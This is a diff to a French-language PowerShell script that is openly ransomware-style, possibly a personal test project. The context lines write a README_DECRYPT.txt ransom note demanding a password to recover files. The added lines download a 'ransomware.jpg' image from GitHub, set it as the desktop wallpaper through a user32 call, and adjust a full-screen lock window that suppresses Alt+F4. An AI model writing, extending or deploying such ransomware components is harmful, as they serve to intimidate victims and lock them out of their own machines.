@@ -49,6 +49,25 @@ Pour recuperer vos fichiers, entrez le mot de passe.
 $utf8Bom = New-Object System.Text.UTF8Encoding $true
 [System.IO.File]::WriteAllText("$folder\README_DECRYPT.txt", $ransom, $utf8Bom)
 
+
+
+# --- FOND D'ECRAN DEPUIS GITHUB ---
+$wallpaperPath = "$env:TEMP\ransom_wallpaper.jpg"
+(New-Object System.Net.WebClient).DownloadFile("https://github.com/asmaerouel/MesTest/blob/a6821a436ce5a48ac7ecf14060d587aa06f26c08/ransomware.jpg", $wallpaperPath)
+
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class Wallpaper {
+    [DllImport("user32.dll")]
+    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+}
+"@
+[Wallpaper]::SystemParametersInfo(20, 0, $wallpaperPath, 3)
+
+
+
+
 # --- FENETRE RANSOMWARE ---
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
@@ -64,7 +83,15 @@ $form.KeyPreview = $true
 
 $form.Add_KeyDown({
     if ($_.KeyCode -eq "F4" -and $_.Alt) { $_.SuppressKeyPress = $true }
-    if ($_.KeyCode -eq "Escape") { $_.SuppressKeyPress = $true }
+    if ($_.KeyCode -eq "Escape") {
+        if ($form.WindowState -eq "Maximized") {
+            $form.WindowState = "Normal"
+            $form.FormBorderStyle = "Sizable"
+        } else {
+            $form.WindowState = "Maximized"
+            $form.FormBorderStyle = "None"
+        }
+    }
 })
 
 $labelTitle = New-Object System.Windows.Forms.Label
